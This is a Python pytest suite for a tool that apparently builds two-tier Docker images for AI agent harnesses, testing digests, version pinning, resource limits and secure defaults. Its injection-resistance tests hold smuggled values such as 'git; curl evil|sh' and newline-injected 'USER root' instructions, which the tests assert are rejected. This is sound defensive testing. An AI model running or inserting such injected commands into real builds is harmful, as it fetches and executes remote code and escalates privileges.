from __future__ import annotations

import pytest
from pydantic import ValidationError

from jormungandr.runtime.compose import compose
from jormungandr.runtime.modules import builtin  # noqa: F401  (registers builtins)
from jormungandr.runtime.modules.base import ModuleError, Stage
from jormungandr.runtime.spec import ContainerSpec, ImageSpec, ResourceLimits


def spec(**kwargs) -> ImageSpec:
    return ImageSpec(target_platform="linux/arm64", **kwargs)


ALL_MODULES = [
    {"name": "apt", "packages": ["git"]},
    {"name": "node", "preinstalled": True},
    {"name": "python"},
    {"name": "opencode"},
    {"name": "langfuse"},
    {"name": "user"},
    {"name": "workdir"},
]


class TestTiering:
    """base = OS + toolchains (rarely changes); runtime = harness + friends."""

    def test_two_tiers_base_first(self) -> None:
        result = compose(spec(modules=ALL_MODULES))
        assert [layer.tier for layer in result.layers] == ["base", "runtime"]

    def test_modules_are_partitioned_by_stage(self) -> None:
        result = compose(spec(modules=ALL_MODULES))
        assert result.base.module_names == ("apt", "user", "node", "python")
        assert result.runtime.module_names == ("opencode", "langfuse", "workdir")

    def test_base_builds_from_the_spec_base_image(self) -> None:
        result = compose(spec(base_image="debian:trixie-slim"))
        assert "FROM debian:trixie-slim" in result.base.dockerfile

    def test_runtime_builds_from_the_base_reference(self) -> None:
        result = compose(spec(modules=ALL_MODULES))
        assert f"FROM {result.base.reference}" in result.runtime.dockerfile

    def test_tiers_are_tagged_distinctly(self) -> None:
        result = compose(spec(modules=ALL_MODULES))
        assert result.base.tag.startswith("base-")
        assert result.runtime.tag.startswith("runtime-")
        assert result.base.reference != result.runtime.reference

    def test_image_reference_is_the_runtime_tier(self) -> None:
        result = compose(spec(modules=ALL_MODULES))
        assert result.reference == result.runtime.reference
        assert result.digest == result.runtime.digest

    def test_harness_change_leaves_the_base_untouched(self) -> None:
        # The whole point of the split: bumping a harness must not invalidate
        # the expensive OS/toolchain image.
        a = compose(spec(modules=[*ALL_MODULES]))
        bumped = [dict(m) for m in ALL_MODULES]
        bumped[3] = {"name": "opencode", "version": "1.18.3"}
        b = compose(spec(modules=bumped))
        assert a.base.digest == b.base.digest
        assert a.runtime.digest != b.runtime.digest

    def test_base_change_propagates_into_the_runtime_digest(self) -> None:
        # The runtime FROMs the base by its content-addressed tag, so this
        # falls out of hashing the rendered Dockerfile — no extra bookkeeping.
        a = compose(spec(modules=ALL_MODULES))
        changed = [dict(m) for m in ALL_MODULES]
        changed[0] = {"name": "apt", "packages": ["git", "jq"]}
        b = compose(spec(modules=changed))
        assert a.base.digest != b.base.digest
        assert a.runtime.digest != b.runtime.digest

    def test_tier_split_is_configurable(self) -> None:
        everything_in_base = compose(spec(modules=ALL_MODULES, tier_split=Stage.USER))
        assert everything_in_base.runtime.module_names == ()
        assert len(everything_in_base.base.module_names) == 7

    def test_empty_tier_is_still_a_valid_layer(self) -> None:
        result = compose(spec())
        assert result.base.module_names == ()
        assert result.runtime.module_names == ()
        assert "FROM" in result.runtime.dockerfile

    def test_parent_is_recorded(self) -> None:
        result = compose(spec(base_image="alpine:3.20"))
        assert result.base.parent == "alpine:3.20"
        assert result.runtime.parent == result.base.reference


class TestCompose:
    def test_platform_is_not_baked_into_from(self) -> None:
        # BuildKit rejects a constant --platform in FROM, and it would fight
        # buildx's own flag. It reaches the build as a command-line argument.
        result = compose(spec())
        assert "--platform" not in result.base.dockerfile
        assert "--platform" not in result.runtime.dockerfile

    def test_deterministic(self) -> None:
        a = compose(spec(modules=ALL_MODULES))
        b = compose(spec(modules=ALL_MODULES))
        assert a.base.dockerfile == b.base.dockerfile
        assert a.runtime.dockerfile == b.runtime.dockerfile
        assert a.digest == b.digest

    def test_module_declaration_order_does_not_change_the_image(self) -> None:
        a = compose(spec(modules=list(ALL_MODULES)))
        b = compose(spec(modules=list(reversed(ALL_MODULES))))
        assert a.base.digest == b.base.digest
        assert a.runtime.digest == b.runtime.digest

    def test_apt_package_order_does_not_change_the_image(self) -> None:
        a = compose(spec(modules=[{"name": "apt", "packages": ["git", "curl"]}]))
        b = compose(spec(modules=[{"name": "apt", "packages": ["curl", "git"]}]))
        assert a.base.digest == b.base.digest

    def test_changing_the_platform_changes_both_tiers(self) -> None:
        a = compose(ImageSpec(target_platform="linux/arm64"))
        b = compose(ImageSpec(target_platform="linux/amd64"))
        assert a.base.digest != b.base.digest
        assert a.runtime.digest != b.runtime.digest

    def test_stage_ordering_within_a_tier(self) -> None:
        result = compose(spec(modules=ALL_MODULES))
        base = result.base.dockerfile
        assert base.index("apt packages") < base.index("python venv")
        runtime = result.runtime.dockerfile
        assert runtime.index("harness: opencode") < runtime.index("langfuse tracing")
        assert runtime.index("langfuse tracing") < runtime.index("workdir /workspace")

    def test_labels_are_stamped_per_tier(self) -> None:
        result = compose(spec(modules=ALL_MODULES))
        assert f"dev.jormungandr.digest={result.base.digest}" in result.base.dockerfile
        assert "dev.jormungandr.tier=base" in result.base.dockerfile
        assert "dev.jormungandr.tier=runtime" in result.runtime.dockerfile
        assert "dev.jormungandr.managed=true" in result.runtime.dockerfile

    def test_digest_label_is_excluded_from_the_hash(self) -> None:
        # Asserting only "the digest appears in the file" is vacuous — it holds
        # either way. Hashing the *final* text must give a different answer,
        # which is only true if the label really was excluded.
        from jormungandr.runtime.identity import content_digest

        layer = compose(spec()).runtime
        assert layer.digest in layer.dockerfile
        rehashed = content_digest(
            dockerfile=layer.dockerfile,
            context_files=layer.context_files,
            context_modes=layer.context_modes,
        )
        assert rehashed != layer.digest, "digest label leaked into its own hash"

    def test_unknown_module_is_a_clear_error(self) -> None:
        with pytest.raises(ModuleError, match="unknown module 'nope'"):
            compose(spec(modules=[{"name": "nope"}]))


class TestOpenCode:
    """OpenCode is the first supported harness.

    Its npm package is a thin wrapper whose payload is a set of
    platform-specific prebuilt binaries shipped as optional dependencies.
    """

    def test_installed_from_npm_with_a_pinned_version(self) -> None:
        # shlex.quote leaves a value alone when it needs no escaping, so the
        # common case stays readable in the generated Dockerfile.
        result = compose(spec(modules=[{"name": "node"}, {"name": "opencode"}]))
        assert "npm install -g opencode-ai@1.18.4" in result.runtime.dockerfile

    def test_version_is_pinned_by_default(self) -> None:
        # An unpinned @latest would make the digest lie: the same tag would
        # refer to different software depending on when it was built.
        assert (
            "@latest"
            not in compose(
                spec(modules=[{"name": "node"}, {"name": "opencode"}])
            ).runtime.dockerfile
        )

    def test_version_change_busts_the_cache(self) -> None:
        def digest(version: str) -> str:
            return compose(
                spec(
                    modules=[{"name": "node"}, {"name": "opencode", "version": version}]
                )
            ).runtime.digest

        assert digest("1.18.4") != digest("1.18.3")

    def test_install_is_verified_at_build_time(self) -> None:
        # npm exits 0 even when no optional binary matched the platform, so
        # running the binary is the only proof the install is usable.
        assert (
            "opencode --version"
            in compose(
                spec(modules=[{"name": "node"}, {"name": "opencode"}])
            ).runtime.dockerfile
        )

    def test_uses_the_npm_cache_mount(self) -> None:
        result = compose(spec(modules=[{"name": "node"}, {"name": "opencode"}]))
        assert "--mount=type=cache,target=/root/.npm" in result.runtime.dockerfile

    def test_lands_in_the_runtime_tier(self) -> None:
        result = compose(
            spec(
                modules=[
                    {"name": "apt", "packages": ["git"]},
                    {"name": "node"},
                    {"name": "opencode"},
                ]
            )
        )
        assert result.runtime.module_names == ("opencode",)
        assert "opencode" not in result.base.dockerfile

    def test_requires_node(self) -> None:
        with pytest.raises(ModuleError, match="requires 'node'"):
            compose(spec(modules=[{"name": "opencode", "requires": ["node"]}]))

    def test_newline_in_version_is_rejected(self) -> None:
        with pytest.raises(ModuleError, match="newline"):
            compose(
                spec(
                    modules=[
                        {"name": "node"},
                        {"name": "opencode", "version": "1\nUSER root"},
                    ]
                )
            )


class TestBuiltinModules:
    def test_script_lands_in_the_runtime_context(self) -> None:
        result = compose(spec(modules=[{"name": "script", "content": "echo hello"}]))
        assert result.runtime.context_files["script.sh"] == "echo hello\n"
        assert result.runtime.context_modes["script.sh"] == 0o755
        assert "COPY script.sh /opt/jormungandr/script.sh" in result.runtime.dockerfile
        assert result.base.context_files == {}

    def test_editing_a_script_busts_only_the_runtime_tier(self) -> None:
        a = compose(spec(modules=[{"name": "script", "content": "echo a"}]))
        b = compose(spec(modules=[{"name": "script", "content": "echo b"}]))
        assert a.base.digest == b.base.digest
        assert a.runtime.digest != b.runtime.digest

    def test_langfuse_bakes_endpoint_but_not_credentials(self) -> None:
        result = compose(spec(modules=[{"name": "python"}, {"name": "langfuse"}]))
        assert "OTEL_EXPORTER_OTLP_ENDPOINT" in result.runtime.dockerfile
        assert "SECRET_KEY" not in result.runtime.dockerfile
        assert "PUBLIC_KEY" not in result.runtime.dockerfile

    def test_langfuse_is_opt_in(self) -> None:
        # The case Teich handles with ARG + if-branches inside RUN layers.
        assert "langfuse" not in compose(spec()).runtime.dockerfile

    def test_apt_uses_a_cache_mount(self) -> None:
        result = compose(spec(modules=[{"name": "apt", "packages": ["git"]}]))
        assert "--mount=type=cache,target=/var/cache/apt" in result.base.dockerfile

    def test_apt_needs_packages(self) -> None:
        with pytest.raises(ModuleError, match="at least one package"):
            compose(spec(modules=[{"name": "apt", "packages": []}]))

    def test_workdir_sets_user_last(self) -> None:
        result = compose(spec(modules=[{"name": "user"}, {"name": "workdir"}]))
        lines = [
            line
            for line in result.runtime.dockerfile.splitlines()
            if line.startswith(("USER", "LABEL"))
        ]
        assert lines[0].startswith("USER agent")


class TestImageSpec:
    def test_duplicate_modules_rejected(self) -> None:
        with pytest.raises(ValidationError, match="declared twice"):
            ImageSpec(modules=[{"name": "node"}, {"name": "node"}])

    def test_bad_platform_rejected(self) -> None:
        with pytest.raises(ValidationError, match="expected os/arch"):
            ImageSpec(target_platform="arm64")

    def test_frozen(self) -> None:
        with pytest.raises(ValidationError):
            ImageSpec().base_image = "other"  # type: ignore[misc]

    def test_unknown_field_rejected(self) -> None:
        with pytest.raises(ValidationError):
            ImageSpec(typo=True)  # type: ignore[call-arg]


class TestResourceLimits:
    def test_defaults_are_set(self) -> None:
        # Neither reference implementation sets any limits at all.
        args = ResourceLimits().docker_args()
        assert "--cpus" in args and "--memory" in args and "--pids-limit" in args

    def test_size_validation(self) -> None:
        with pytest.raises(ValidationError, match="invalid size"):
            ResourceLimits(memory="lots")

    def test_size_normalised(self) -> None:
        assert ResourceLimits(memory="4G").memory == "4g"

    def test_limits_can_be_disabled_explicitly(self) -> None:
        assert (
            ResourceLimits(cpus=None, memory=None, pids=None, nofile=None).docker_args()
            == []
        )


class TestContainerSpec:
    def test_secret_env_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="refusing to pass"):
            ContainerSpec(image="x", env={"LANGFUSE_SECRET_KEY": "sk-1"})

    def test_api_key_env_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="refusing to pass"):
            ContainerSpec(image="x", env={"ANTHROPIC_API_KEY": "sk-ant"})

    def test_ordinary_env_is_fine(self) -> None:
        assert ContainerSpec(image="x", env={"LANGFUSE_HOST": "https://h"}).env

    def test_secure_defaults(self) -> None:
        container = ContainerSpec(image="x")
        assert container.no_new_privileges
        assert container.cap_drop_all
        assert container.init


class TestDigestCoversEverythingThatChangesTheImage:
    """An input that changes the image must change the tag.

    Anything missed here means a stale image is silently reused.
    """

    def test_labels_are_in_the_digest(self) -> None:
        a = compose(spec(labels={"experiment": "run-A"}))
        b = compose(spec(labels={"experiment": "run-B"}))
        assert a.digest != b.digest

    def test_label_order_does_not_matter(self) -> None:
        a = compose(spec(labels={"x": "1", "y": "2"}))
        b = compose(spec(labels={"y": "2", "x": "1"}))
        assert a.digest == b.digest

    def test_context_file_mode_is_in_the_digest(self) -> None:
        from jormungandr.runtime.identity import content_digest

        a = content_digest(
            dockerfile="F", context_files={"s": "x"}, context_modes={"s": 0o644}
        )
        b = content_digest(
            dockerfile="F", context_files={"s": "x"}, context_modes={"s": 0o755}
        )
        assert a != b

    def test_base_image_change_is_visible(self) -> None:
        a = compose(spec(base_image="debian:trixie-slim"))
        b = compose(spec(base_image="ubuntu:24.04"))
        assert a.base.digest != b.base.digest

    def test_build_args_are_rendered_and_hashed(self) -> None:
        a = compose(spec(build_args={"FOO": "1"}))
        b = compose(spec(build_args={"FOO": "2"}))
        assert "ARG FOO=1" in a.base.dockerfile
        assert a.base.digest != b.base.digest


class TestInjectionResistance:
    """Module config is interpolated into shell command bodies.

    A newline does not escape a string here — it ends the instruction and
    starts a new one, so it needs no attacker to corrupt a Dockerfile.
    """

    def test_newline_in_apt_package_is_rejected(self) -> None:
        with pytest.raises(ModuleError, match="unsafe"):
            compose(spec(modules=[{"name": "apt", "packages": ["git\nUSER root"]}]))

    def test_shell_metacharacters_in_apt_package_rejected(self) -> None:
        with pytest.raises(ModuleError, match="unsafe"):
            compose(spec(modules=[{"name": "apt", "packages": ["git; curl evil|sh"]}]))

    def test_string_uid_is_rejected(self) -> None:
        # ModuleDeclaration allows extra fields without type coercion, so YAML
        # hands the int-annotated uid whatever was written.
        with pytest.raises(ModuleError, match="uid must be an integer"):
            compose(spec(modules=[{"name": "user", "uid": "0 --groups root; evil"}]))

    def test_injection_via_workspace_user_rejected(self) -> None:
        with pytest.raises(ModuleError, match="unsafe"):
            compose(spec(modules=[{"name": "user", "user": "a; curl evil|sh"}]))

    def test_version_specifiers_are_quoted_not_rejected(self) -> None:
        # `langfuse>=3,<4` is a legitimate pin; quoting keeps it intact and
        # inert rather than banning it.
        result = compose(
            spec(
                modules=[{"name": "python"}, {"name": "langfuse", "version": ">=3,<4"}]
            )
        )
        assert "'langfuse>=3,<4'" in result.runtime.dockerfile

    def test_newline_in_build_arg_is_rejected(self) -> None:
        from jormungandr.runtime.layers import DockerfileError

        with pytest.raises(DockerfileError, match="newline"):
            compose(spec(build_args={"A\nUSER root\nRUN echo pwned": "1"}))

    def test_newline_in_label_is_rejected(self) -> None:
        from jormungandr.runtime.layers import DockerfileError

        with pytest.raises(DockerfileError, match="newline"):
            compose(spec(labels={"a": "1\nUSER root"}))


class TestUserAccountHome:
    """HOME must be explicit, not inferred from /etc/passwd.

    Docker resolves HOME by mapping the uid to the *first* matching name, and
    --non-unique means two names share uid 1000 on a node base image. `USER
    agent` therefore yielded HOME=/home/node. Harnesses keep state and
    credentials under HOME (~/.factory, ~/.local/share/opencode), so a wrong
    HOME silently sends them somewhere the image never prepared.
    """

    def test_home_is_set_explicitly(self) -> None:
        # In the BASE tier: HOME must exist before any harness writes config
        # into it at Stage.HARNESS.
        out = compose(spec(modules=[{"name": "user"}])).base.dockerfile
        assert "ENV HOME=/home/agent" in out

    def test_home_follows_the_user(self) -> None:
        out = compose(
            spec(modules=[{"name": "user", "user": "runner"}])
        ).base.dockerfile
        assert "ENV HOME=/home/runner" in out

    def test_home_is_created_and_owned(self) -> None:
        out = compose(spec(modules=[{"name": "user"}])).base.dockerfile
        assert "mkdir -p /home/agent" in out
        assert "chown -R agent /home/agent" in out

    def test_home_is_in_the_digest(self) -> None:
        a = compose(spec(modules=[{"name": "user", "user": "a"}])).base.digest
        b = compose(spec(modules=[{"name": "user", "user": "b"}])).base.digest
        assert a != b


class TestDroid:
    """Factory's droid CLI, verified against a real container."""

    def test_installed_from_npm_pinned(self) -> None:
        out = compose(
            spec(modules=[{"name": "node"}, {"name": "droid"}])
        ).runtime.dockerfile
        assert "npm install -g droid@0.176.0" in out
        assert "droid --version" in out

    def test_auto_update_disabled_by_default(self) -> None:
        # A harness that updates itself inside a container invalidates the
        # promise its digest makes: same digest, different software.
        out = compose(
            spec(modules=[{"name": "node"}, {"name": "droid"}])
        ).runtime.dockerfile
        assert "FACTORY_DROID_AUTO_UPDATE_ENABLED=false" in out

    def test_auto_update_can_be_re_enabled(self) -> None:
        out = compose(
            spec(modules=[{"name": "node"}, {"name": "droid", "auto_update": True}])
        ).runtime.dockerfile
        assert "FACTORY_DROID_AUTO_UPDATE_ENABLED" not in out

    def test_airgap_is_on_by_default(self) -> None:
        # Unlike droid's own default. This runtime runs agents against your own
        # provider endpoints, where the Factory cloud call is pure failure
        # surface — and its symptom is a bare "Exec failed".
        out = compose(
            spec(modules=[{"name": "node"}, {"name": "droid"}])
        ).runtime.dockerfile
        assert "FACTORY_AIRGAP_ENABLED=true" in out

    def test_airgap_can_be_turned_off(self) -> None:
        out = compose(
            spec(modules=[{"name": "node"}, {"name": "droid", "airgap": False}])
        ).runtime.dockerfile
        assert "FACTORY_AIRGAP_ENABLED" not in out

    def test_airgap_enables_byok_without_a_factory_account(self) -> None:
        # Verified end to end: without this, `droid exec` opens a cloud session
        # first and dies with 401 before ever calling the custom endpoint.
        out = compose(
            spec(modules=[{"name": "node"}, {"name": "droid", "airgap": True}])
        ).runtime.dockerfile
        assert "FACTORY_AIRGAP_ENABLED=true" in out

    def test_airgap_changes_the_digest(self) -> None:
        a = compose(spec(modules=[{"name": "node"}, {"name": "droid"}])).runtime.digest
        b = compose(
            spec(modules=[{"name": "node"}, {"name": "droid", "airgap": False}])
        ).runtime.digest
        assert a != b

    def test_requires_node(self) -> None:
        with pytest.raises(ModuleError, match="requires 'node'"):
            compose(spec(modules=[{"name": "droid"}]))

    def test_lands_in_the_runtime_tier(self) -> None:
        result = compose(spec(modules=[{"name": "node"}, {"name": "droid"}]))
        assert result.runtime.module_names == ("droid",)
